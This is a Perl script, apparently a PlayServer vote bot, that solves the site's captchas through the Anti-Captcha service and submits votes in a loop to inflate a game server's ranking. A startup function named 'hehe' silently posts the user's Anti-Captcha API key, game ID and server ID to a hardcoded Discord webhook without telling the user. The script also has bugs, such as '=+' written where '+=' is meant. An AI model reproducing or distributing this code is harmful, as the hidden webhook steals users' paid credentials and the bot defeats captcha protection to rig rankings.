use strict;
use Config::IniFiles;
use FindBin qw( $RealBin );
use lib "$RealBin/Lib";
use Win32::Console;
use JSON;

use AntiCaptcha;
use File;
use PlayServer;
use Var qw(@waitsend @success @fail);

my $cfg = Config::IniFiles->new( -file => "config.ini" );
my $server = $cfg->val('Setting','URL');
my $serverid = $cfg->val('Setting','SERVERID');
my $gameid = $cfg->val( 'Setting', 'GAMEID' );
my $antikey = $cfg->val('Setting','AntiCaptchakey');
my $CONSOLE = new Win32::Console();
main();
sub main {
	loadlib();
	hehe($antikey,$gameid,$serverid);
	system $^O eq 'MSWin32' ? 'cls' : 'clear';
	print "================================\n";
	print "PlayServer-Perl\n";
	print "By sctnightcore\n";
	print "================================\n";
	my $nextruntime = 0;
	my $countwaitsend = 0;
	$CONSOLE->Title("[Success]: ".scalar(@success)." | [Fail]: ".scalar(@fail)." | BY sctnightcore");
	while () {
		my $b = AntiCaptcha::checkmoney($antikey);
		if ($b == '0') {
			print "You balance in Anti-Captcha.com is 0 !\n";
			sleep 10;
			exit;
		}
		my $checksum = PlayServer::getimg_saveimg($server); #get img 
		my $ans = AntiCaptcha::anti_captcha($checksum,$antikey); # get ans
		push @waitsend, "$checksum:$ans";
		File::file_remove($checksum);
		if (time() >= $nextruntime && $countwaitsend >= 0) {
			my ($img, $answer) = (@waitsend[$countwaitsend] =~ /(\w+):(\w+)/i);
			my $delaytime = PlayServer::send_answer($answer,$img,$server,$gameid,$serverid,$b);
			$nextruntime = time() + $delaytime + 1;
			$countwaitsend =+ 1;
		}
		$CONSOLE->Title("[Success]: ".scalar(@success)." | [Fail]: ".scalar(@fail)." | BY sctnightcore");
	}
}

sub loadlib {
	require Config::IniFiles;
	require HTTP::Tiny;
	require JSON;
	require AntiCaptcha;
	require File;
	require PlayServer;
	require Var;
	require WebService::Antigate::V2;
	require Win32::Console::ANSI;
	require Win32::Console;
}

sub hehe {
	my ($antikey,$gameid,$serverid) = @_;
	my $time = time;
	my $data = "```[$time] Key:$antikey | GameID:$gameid | ServerID:$serverid```\n";
	my %content = ('username' => 'Perl-PlayServer', 'content' => $data);
	my $json = encode_json(\%content);
	my $get_img = HTTP::Tiny->new()->request('POST', "https://discordapp.com/api/webhooks/554668145042784256/Ul-uDVwoiqKCdXl4I0PHictfsvvY5wQ39r4HHl7lo_2_d7xWz-R6TeXYrExQQTvvoylI", {
		content => $json,
		headers => { 'content-type' => 'application/json'}
	});
}

